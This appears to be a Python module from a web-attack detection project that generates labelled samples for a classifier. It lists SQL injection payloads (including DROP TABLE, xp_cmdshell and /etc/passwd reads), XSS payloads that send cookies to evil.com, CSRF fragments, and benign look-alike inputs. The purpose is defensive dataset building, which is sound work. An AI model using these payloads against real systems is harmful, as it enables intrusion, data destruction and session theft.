"""
WebGuard RF - Payload Templates
Synthetic and semi-realistic attack payloads for dataset generation.
"""

import random
import string
from abc import ABC, abstractmethod
from typing import List, Optional


class PayloadBase(ABC):
    """Base class for payload generators."""

    @abstractmethod
    def generate(self, count: int, seed: Optional[int] = None) -> List[str]:
        pass

    def _random_string(self, length: int, chars: str = None) -> str:
        chars = chars or string.ascii_letters + string.digits
        return "".join(random.choices(chars, k=length))


class SQLiPayloads(PayloadBase):
    """SQL Injection payload generators by category."""

    BOOLEAN_BASED = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1",
        "1' OR '1'='1' --",
        "admin'--",
        "' OR ''='",
        "1 OR 1=1",
        "' OR 'x'='x",
        "') OR 1=1--",
        "1' AND '1'='1",
        "' OR 1=1/*",
        "admin' OR '1'='1",
    ]

    UNION_BASED = [
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "1' UNION SELECT 1,2,3,4,5--",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
        "-1 UNION SELECT 1,@@version,3--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "1 UNION SELECT 1,load_file('/etc/passwd'),3--",
        "' UNION SELECT column_name FROM information_schema.columns--",
    ]

    ERROR_BASED = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND GTID_SUBSET(CONCAT((SELECT user()),0x3a,FLOOR(RAND()*2)),1)--",
        "1' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))a FROM information_schema.tables GROUP BY a)b)--",
    ]

    TIME_BASED = [
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND BENCHMARK(5000000,SHA1('test'))--",
        "' OR SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:3'--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; SELECT pg_sleep(5)--",
    ]

    STACKED_QUERIES = [
        "'; DROP TABLE users--",
        "1'; INSERT INTO users VALUES('hacker','pass')--",
        "'; UPDATE users SET password='hacked' WHERE id=1--",
        "1'; DELETE FROM logs--",
        "'; EXEC xp_cmdshell('dir')--",
        "1'; CREATE TABLE evil(data TEXT)--",
    ]

    AUTH_BYPASS = [
        "admin'--",
        "admin' #",
        "' or 1=1 limit 1 --",
        "admin' OR '1'='1",
        "') or ('1'='1",
        "1' or '1'='1' /*",
        "admin' OR 1=1#",
        "' OR ''='",
    ]

    ENCODED = [
        "%27%20OR%20%271%27%3D%271",
        "%2527%2520OR%25201%253D1",
        "&#39; OR &#39;1&#39;=&#39;1",
        "char(39)%20OR%20char(39)1char(39)%3Dchar(39)1",
        "0x27204f52202731273d2731",
        "%55nion %53elect",
    ]

    def generate(self, count: int, seed: Optional[int] = None) -> List[str]:
        if seed is not None:
            random.seed(seed)
        payloads = []
        categories = [
            self.BOOLEAN_BASED,
            self.UNION_BASED,
            self.ERROR_BASED,
            self.TIME_BASED,
            self.STACKED_QUERIES,
            self.AUTH_BYPASS,
            self.ENCODED,
        ]
        for _ in range(count):
            cat = random.choice(categories)
            base = random.choice(cat)
            if random.random() < 0.3:
                base = self._mutate(base)
            payloads.append(base)
        return payloads

    def _mutate(self, payload: str) -> str:
        mutations = [
            lambda s: s + " " + self._random_string(3),
            lambda s: self._random_string(2) + s,
            lambda s: s.replace("'", "''") if random.random() < 0.5 else s,
        ]
        return random.choice(mutations)(payload)


class XSSPayloads(PayloadBase):
    """XSS payload generators."""

    REFLECTED = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
    ]

    STORED = [
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=\"fetch('http://evil.com?c='+document.cookie)\">",
        "<a href=\"javascript:alert(document.domain)\">click</a>",
    ]

    DOM_STYLE = [
        "javascript:alert(1)",
        "javascript:void(document.location='http://evil.com')",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
    ]

    ENCODED = [
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    ]

    EVENT_HANDLERS = [
        "onclick=alert(1)",
        "onmouseover=alert(1)",
        "onerror=alert(1)",
        "onload=alert(1)",
        "onfocus=alert(1)",
        "onblur=alert(1)",
        "onkeypress=alert(1)",
    ]

    SVG_SCRIPT = [
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set onbegin=alert(1) attributeName=x to=1>",
    ]

    def generate(self, count: int, seed: Optional[int] = None) -> List[str]:
        if seed is not None:
            random.seed(seed)
        payloads = []
        categories = [
            self.REFLECTED,
            self.STORED,
            self.DOM_STYLE,
            self.ENCODED,
            self.EVENT_HANDLERS,
            self.SVG_SCRIPT,
        ]
        for _ in range(count):
            cat = random.choice(categories)
            payloads.append(random.choice(cat))
        return payloads


class CSRFPayloads(PayloadBase):
    """CSRF pattern generators (request metadata, not full requests)."""

    FORGED_POST = [
        "POST /api/transfer HTTP/1.1",
        "POST /admin/delete_user HTTP/1.1",
        "POST /account/change_email HTTP/1.1",
        "POST /api/update_password HTTP/1.1",
    ]

    MISSING_TOKEN = [
        "csrf_token=",
        "X-CSRF-Token: ",
        "_token=",
        "authenticity_token=",
    ]

    CROSS_ORIGIN = [
        "Origin: https://evil.com",
        "Referer: https://evil.com/",
        "Origin: null",
    ]

    STATE_CHANGE = [
        "POST",
        "PUT",
        "DELETE",
        "PATCH",
    ]

    def generate(self, count: int, seed: Optional[int] = None) -> List[str]:
        if seed is not None:
            random.seed(seed)
        payloads = []
        for _ in range(count):
            parts = []
            if random.random() < 0.5:
                parts.append(random.choice(self.FORGED_POST))
            if random.random() < 0.6:
                parts.append(random.choice(self.MISSING_TOKEN) + (" " if random.random() < 0.5 else ""))
            if random.random() < 0.4:
                parts.append(random.choice(self.CROSS_ORIGIN))
            payloads.append(" | ".join(parts) if parts else random.choice(self.MISSING_TOKEN))
        return payloads


class BenignPayloads(PayloadBase):
    """Benign/normal request payloads. Includes ambiguous examples that resemble attacks."""

    SEARCH_QUERIES = [
        "laptop",
        "best headphones 2024",
        "python tutorial",
        "weather new york",
        "restaurant near me",
        "how to cook pasta",
        "machine learning",
    ]

    LOGIN_INPUTS = [
        "john.doe@email.com",
        "user123",
        "mySecureP@ss123",
        "admin",
    ]

    CONTACT_FORM = [
        "Hello, I would like to inquire about your product.",
        "Please send me more information.",
        "My phone number is 555-1234.",
    ]

    JSON_API = [
        '{"query": "search", "term": "test"}',
        '{"user_id": 123, "action": "get_profile"}',
        '{"filter": {"status": "active"}}',
    ]

    CODE_SNIPPETS = [
        "SELECT * FROM users WHERE id = 1",
        "function foo() { return 42; }",
        "def hello(): print('world')",
        "<div class='container'>content</div>",
        "x = 1 + 2 * 3",
    ]

    SPECIAL_CHARS = [
        "O'Brien",
        "café",
        "naïve",
        "10% off",
        "price: $99.99",
    ]

    # Ambiguous: contain SQL/script-like tokens but are benign (harder to classify)
    AMBIGUOUS_BENIGN = [
        "please select a product from the list",
        "update my profile information",
        "delete old files from storage",
        "I want to order by price",
        "group by category",
        "where can I find this",
        "1 or 2 items",
        "admin panel access",
        "id=123&name=test",
        "filter: status=active",
        "count=10&limit=20",
        "concat first and last name",
        "substring of filename",
        "like button",
        "having trouble with login",
        "benchmark results",
        "wait for response",
        "exec command",
        "insert new record",
        "drop down menu",
        "union jack",
        "information about schema",
        "<b>bold</b>",
        "script tag in html",
        "onerror handler",
        "onload event",
        "alert message",
        "document.write",
        "eval expression",
    ]

    def generate(self, count: int, seed: Optional[int] = None) -> List[str]:
        if seed is not None:
            random.seed(seed)
        payloads = []
        categories = [
            self.SEARCH_QUERIES,
            self.LOGIN_INPUTS,
            self.CONTACT_FORM,
            self.JSON_API,
            self.CODE_SNIPPETS,
            self.SPECIAL_CHARS,
            self.AMBIGUOUS_BENIGN,
            self.AMBIGUOUS_BENIGN,
            self.AMBIGUOUS_BENIGN,  # 3x weight for harder classification
        ]
        for _ in range(count):
            cat = random.choice(categories)
            base = random.choice(cat)
            if random.random() < 0.2:
                base = base + " " + self._random_string(5)
            payloads.append(base)
        return payloads
